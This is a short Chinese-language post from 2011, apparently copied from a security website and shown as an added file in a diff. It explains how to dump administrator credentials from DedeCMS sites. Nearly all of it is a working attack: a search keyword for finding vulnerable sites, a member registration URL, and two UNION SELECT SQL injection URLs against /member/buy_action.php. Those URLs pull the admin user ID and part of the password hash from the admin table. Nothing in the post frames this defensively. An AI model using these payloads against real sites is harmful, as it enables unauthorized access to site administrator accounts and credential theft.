@@ -1,0 +1,13 @@
+2011-05-07  织梦科技注入爆管理员用户密码方法
+www.hx99.net    时间: 2011-05-07    阅读: 次     整理: 华西安全网
+搜索关键词:powered by dedecms
+
+首先注册个用户,注册地址:
+/member/index_do.php?fmdo=user&dopost=regnew 
+
+爆管理帐号:
+/member/buy_action.php?product=member&pid=1%20and%201=11%20union%20select%201,2,userid,4,5%20from%20%23@__admin/* 
+
+爆管理员密码
+/member/buy_action.php?product=member&pid=1%20and%201=11%20union%20select%201,2,substring(pwd,9,16),4,5%20from%20%23@__admin/*
+
